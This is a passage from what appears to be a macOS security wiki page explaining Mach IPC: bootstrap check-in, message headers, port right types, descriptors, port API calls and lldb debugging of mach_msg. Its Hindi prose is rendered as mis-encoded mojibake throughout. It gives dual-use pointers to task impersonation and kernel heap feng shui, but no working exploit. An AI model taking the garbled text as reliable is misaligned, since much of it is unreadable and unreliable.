* рдХрд╛рд░реНрдп **A** (рд╕реЗрд╡рд╛) рдПрдХ **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рдЪреЗрдХ-рдЗрди** (`bootstrap_check_in()`) рдХрд░рддрд╛ рд╣реИред рдпрд╣рд╛рдБ, **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк** рд╕рд░реНрд╡рд░ рдПрдХ SEND рдЕрдзрд┐рдХрд╛рд░ рдмрдирд╛рддрд╛ рд╣реИ, рдЗрд╕реЗ рд░рдЦрддрд╛ рд╣реИ, рдФрд░ **рдкреНрд░рд╛рдкреНрддрд┐ рдЕрдзрд┐рдХрд╛рд░ рдХрд╛рд░реНрдп A рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред
* launchd **SEND рдЕрдзрд┐рдХрд╛рд░ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХрд╛рд░реНрдп B рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ**ред
* рдХрд╛рд░реНрдп **B** рдПрдХ рдирдпрд╛ рдкреЛрд░реНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдкреНрд░рд╛рдкреНрддрд┐** рдЕрдзрд┐рдХрд╛рд░ рдФрд░ рдПрдХ **SEND** рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ **SEND рдЕрдзрд┐рдХрд╛рд░ рдХрд╛рд░реНрдп A** (рд╕реЗрд╡рд╛) рдХреЛ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдХрд╛рд░реНрдп B рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХреЗ (рджреНрд╡рд┐рджрд┐рд╢реАрдп рд╕рдВрдЪрд╛рд░)ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗрд╡рд▓ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдХрд╛рд░реНрдпреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИред рдЧреИрд░-рдкреНрд░рдгрд╛рд▓реА рдХрд╛рд░реНрдп рдЕрднреА рднреА рдореВрд▓ рд░реВрдк рд╕реЗ рд╡рд░реНрдгрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреБрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

{% hint style="danger" %}
рдЗрд╕рд▓рд┐рдП, launchd рдХрднреА рднреА рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рдкреВрд░рд╛ рд╕рд┐рд╕реНрдЯрдо рдХреНрд░реИрд╢ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` рдлрд╝рдВрдХреНрд╢рди, рдЬреЛ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╣реИ, Mach рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд╝рдВрдХреНрд╢рди рдХреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрджреЗрд╢ рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдпрд╣ рд╕рдВрджреЗрд╢ `mach_msg_header_t` рд╕рдВрд░рдЪрдирд╛ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рдХреЗ рдмрд╛рдж рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрджреЗрд╢ рд╕рд╛рдордЧреНрд░реА рдЖрддреА рд╣реИред рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

* First bit (most significative) is used to indicate that a message is complex (more on this below)
* The 3rd and 4th are used by the kernel
* The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
* The **5 least significant bits of the 3rd byte** from can be used for **local port**
* The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `MACH_MSG_TYPE_MAKE_SEND_ONCE` рдХрд╛ рдЙрдкрдпреЛрдЧ **рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдкреЛрд░реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ **send-once** **рдЕрдзрд┐рдХрд╛рд░** рдирд┐рдХрд╛рд▓рд╛ рдФрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕реЗ `MACH_PORT_NULL` рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рди рд╣реЛред

рдПрдХ рдЖрд╕рд╛рди **рджреНрд╡рд┐-рдорд╛рд░реНрдЧреАрдп рд╕рдВрдЪрд╛рд░** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **mach рдкреЛрд░реНрдЯ** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреЛ mach **рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░** рдореЗрдВ _reply port_ (**`msgh_local_port`**) рдХрд╣рд▓рд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рд╕рдВрджреЗрд╢ рдХрд╛ **рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛** рдЗрд╕ рд╕рдВрджреЗрд╢ рдХреЛ **рдЙрддреНрддрд░** рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

{% hint style="success" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рджреНрд╡рд┐-рдорд╛рд░реНрдЧреАрдп рд╕рдВрдЪрд╛рд░ XPC рд╕рдВрджреЗрд╢реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкреБрдирдГ рдЦреЗрд▓ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ (`xpc_connection_send_message_with_reply` рдФрд░ `xpc_connection_send_message_with_reply_sync`)ред рд▓реЗрдХрд┐рди **рдЖрдорддреМрд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдкреЛрд░реНрдЯ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рджреНрд╡рд┐-рдорд╛рд░реНрдЧреАрдп рд╕рдВрдЪрд╛рд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
{% endhint %}

рд╕рдВрджреЗрд╢ рд╣реЗрдбрд░ рдХреЗ рдЕрдиреНрдп рдХреНрд╖реЗрддреНрд░ рд╣реИрдВ:

* `msgh_size`: рдкреВрд░реЗ рдкреИрдХреЗрдЯ рдХрд╛ рдЖрдХрд╛рд░ред
* `msgh_remote_port`: рд╡рд╣ рдкреЛрд░реНрдЯ рдЬрд┐рд╕ рдкрд░ рдпрд╣ рд╕рдВрджреЗрд╢ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред
* `msgh_voucher_port`: [mach рд╡рд╛рдЙрдЪрд░](https://robert.sesek.com/2023/6/mach\_vouchers.html)ред
* `msgh_id`: рдЗрд╕ рд╕рдВрджреЗрд╢ рдХреА ID, рдЬрд┐рд╕реЗ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **mach рд╕рдВрджреЗрд╢ `mach port` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рдЬреЛ рдПрдХ **рдПрдХрд▓ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛**, **рдХрдИ рдкреНрд░реЗрд╖рдХ** рд╕рдВрдЪрд╛рд░ рдЪреИрдирд▓ рд╣реИ рдЬреЛ mach рдХрд░реНрдиреЗрд▓ рдореЗрдВ рдирд┐рд░реНрдорд┐рдд рд╣реИред **рдХрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ** рдПрдХ mach рдкреЛрд░реНрдЯ рдкрд░ **рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреА рд╣реИрдВ**, рд▓реЗрдХрд┐рди рдХрд┐рд╕реА рднреА рд╕рдордп рдХреЗрд╡рд▓ **рдПрдХрд▓ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реА рдкрдврд╝ рд╕рдХрддреА рд╣реИ**ред
{% endhint %}

рд╕рдВрджреЗрд╢ рдлрд┐рд░ **`mach_msg_header_t`** рд╣реЗрдбрд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ рдмрд╛рдж **рд╢рд░реАрд░** рдФрд░ **рдЯреНрд░реЗрд▓рд░** (рдпрджрд┐ рдХреЛрдИ рд╣реЛ) рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдХрд░реНрдиреЗрд▓ рдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдХрд╛рд░реНрдп рд╕реЗ рджреВрд╕рд░реЗ рдХрд╛рд░реНрдп рдореЗрдВ рд╕рдВрджреЗрд╢ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдПрдХ **рдЯреНрд░реЗрд▓рд░** **рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рд╕рдВрджреЗрд╢ рдореЗрдВ рдЬреЛрдбрд╝реА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА** рд╣реИ (рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛) рдЬрд┐рд╕реЗ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрддрд┐ рдореЗрдВ `MACH_RCV_TRAILER_<trailer_opt>` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рд╡рд┐рднрд┐рдиреНрди рдЬрд╛рдирдХрд╛рд░реА рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)ред

#### рдЬрдЯрд┐рд▓ рд╕рдВрджреЗрд╢

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдиреНрдп рдЕрдзрд┐рдХ **рдЬрдЯрд┐рд▓** рд╕рдВрджреЗрд╢ рд╣реИрдВ, рдЬреИрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдпрд╛ рдореЗрдореЛрд░реА рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ, рдЬрд╣рд╛рдБ рдХрд░реНрдиреЗрд▓ рдХреЛ рднреА рдЗрди рд╡рд╕реНрддреБрдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╣реЗрдбрд░ `msgh_bits` рдХрд╛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдЯ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд░реНрдгрдирдХрд░реНрддрд╛рдУрдВ рдХреЛ [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32рдмрд┐рдЯреНрд╕ рдореЗрдВ, рд╕рднреА рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ 12B рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдкреНрд░рдХрд╛рд░ 11рд╡реЗрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред 64 рдмрд┐рдЯреНрд╕ рдореЗрдВ, рдЖрдХрд╛рд░ рднрд┐рдиреНрди рд╣реЛрддреЗ рд╣реИрдВред

{% hint style="danger" %}
рдХрд░реНрдиреЗрд▓ рдПрдХ рдХрд╛рд░реНрдп рд╕реЗ рджреВрд╕рд░реЗ рдХрд╛рд░реНрдп рдореЗрдВ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рдХреА рдХреЙрдкреА рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ **рдХрд░реНрдиреЗрд▓ рдореЗрдореЛрд░реА рдореЗрдВ рдПрдХ рдХреЙрдкреА рдмрдирд╛рдПрдЧрд╛**ред рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ "рдлреЗрдВрдЧ рд╢реБрдИ" рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдХрдИ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ **рдХрд░реНрдиреЗрд▓ рдЕрдкрдиреЗ рдореЗрдореЛрд░реА рдореЗрдВ рдбреЗрдЯрд╛ рдХреЙрдкреА рдХрд░реЗ** рдЬрд┐рд╕рд╕реЗ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЕрдкрдиреЗ рд▓рд┐рдП рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рднреЗрдЬ рд╕рдХреЗред рдлрд┐рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ (рдХрд░реНрдиреЗрд▓ рдЙрдиреНрд╣реЗрдВ рдореБрдХреНрдд рдХрд░ рджреЗрдЧрд╛)ред

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдПрдХ рдХрдордЬреЛрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рднреЗрдЬреЗ рдЬрд╛рдПрдВ**, рдФрд░ рдкреЛрд░реНрдЯ рдЕрдзрд┐рдХрд╛рд░ рдмрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗ (рднрд▓реЗ рд╣реА рд╡рд╣ рдЙрдиреНрд╣реЗрдВ рд╕рдВрднрд╛рд▓ рдирд╣реАрдВ рд░рд╣реА рд╣реЛ)ред
{% endhint %}

### рдореИрдХ рдкреЛрд░реНрдЯреНрд╕ рдПрдкреАрдЖрдИ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреЛрд░реНрдЯ рдХрд╛рд░реНрдп рдирд╛рдорд╕реНрдерд╛рди рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдПрдХ рдкреЛрд░реНрдЯ рдмрдирд╛рдиреЗ рдпрд╛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдХрд╛рд░реНрдп рдирд╛рдорд╕реНрдерд╛рди рдХреЛ рднреА рдХреНрд╡реЗрд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП `mach/mach_port.h` рджреЗрдЦреЗрдВ):

* **`mach_port_allocate` | `mach_port_construct`**: **рдПрдХ рдкреЛрд░реНрдЯ рдмрдирд╛рдПрдБ**ред
* `mach_port_allocate` рдПрдХ **рдкреЛрд░реНрдЯ рд╕реЗрдЯ** рднреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ: рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рдореВрд╣ рдкрд░ рдкреНрд░рд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ред рдЬрдм рднреА рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХрд┐рд╕ рдкреЛрд░реНрдЯ рд╕реЗ рдерд╛ред
* `mach_port_allocate_name`: рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ 32рдмрд┐рдЯ рдкреВрд░реНрдгрд╛рдВрдХ)
* `mach_port_names`: рдПрдХ рд▓рдХреНрд╖реНрдп рд╕реЗ рдкреЛрд░реНрдЯ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `mach_port_type`: рдПрдХ рдирд╛рдо рдкрд░ рдХрд╛рд░реНрдп рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* `mach_port_rename`: рдПрдХ рдкреЛрд░реНрдЯ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ (рдЬреИрд╕реЗ FDs рдХреЗ рд▓рд┐рдП dup2)
* `mach_port_allocate`: рдПрдХ рдирдпрд╛ RECEIVE, PORT_SET рдпрд╛ DEAD_NAME рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ
* `mach_port_insert_right`: рдПрдХ рдкреЛрд░реНрдЯ рдореЗрдВ рдПрдХ рдирдпрд╛ рдЕрдзрд┐рдХрд╛рд░ рдмрдирд╛рдПрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ RECEIVE рд╣реИ
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: **рдорд╛рдЪ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рдВрдХреНрд╢рди**ред рдУрд╡рд░рд░рд╛рдЗрдЯ рд╕рдВрд╕реНрдХрд░рдг рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрддрд┐ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рдмрдлрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рджреВрд╕рд░рд╛ рд╕рдВрд╕реНрдХрд░рдг рдмрд╕ рдЗрд╕рдХрд╛ рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛)ред

### рдбрд┐рдмрдЧ mach\_msg

рдЪреВрдВрдХрд┐ рдлрд╝рдВрдХреНрд╢рди **`mach_msg`** рдФрд░ **`mach_msg_overwrite`** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрди рдкрд░ рдПрдХ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рд╕реЗрдЯ рдХрд░рдиреЗ рд╕реЗ рднреЗрдЬреЗ рдЧрдП рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдирд┐рд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреАред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХрд┐рд╕реА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдбрд┐рдмрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рдбрд┐рдмрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **`libSystem.B` рд▓реЛрдб рдХрд░реЗрдЧрд╛ рдЬреЛ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛**ред

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`** рдХреЗ рддрд░реНрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдпреЗ рддрд░реНрдХ рд╣реИрдВ (рд╕реЗ [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
рд░рдЬрд┐рд╕реНрдЯреНрд░рд┐рдпреЛрдВ рд╕реЗ рдорд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
